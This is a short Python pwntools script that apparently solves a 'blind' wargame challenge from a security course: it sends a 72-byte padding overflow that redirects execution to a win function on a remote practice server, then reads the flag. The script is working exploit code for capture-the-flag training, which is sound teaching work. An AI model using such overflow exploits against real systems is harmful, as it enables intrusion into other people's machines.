from pwn import *
from pwnlib.util.packing import p32, u32

p = remote('comp6447.wtf', 28872)
elf = ELF('./wargame2/blind')

offset = 72
winAddr = 0x080484d6

payload = "A".encode() * offset + p32(elf.symbols['win'])

p.sendline(payload)
p.sendline("cat flag")

p.interactive()
p.close()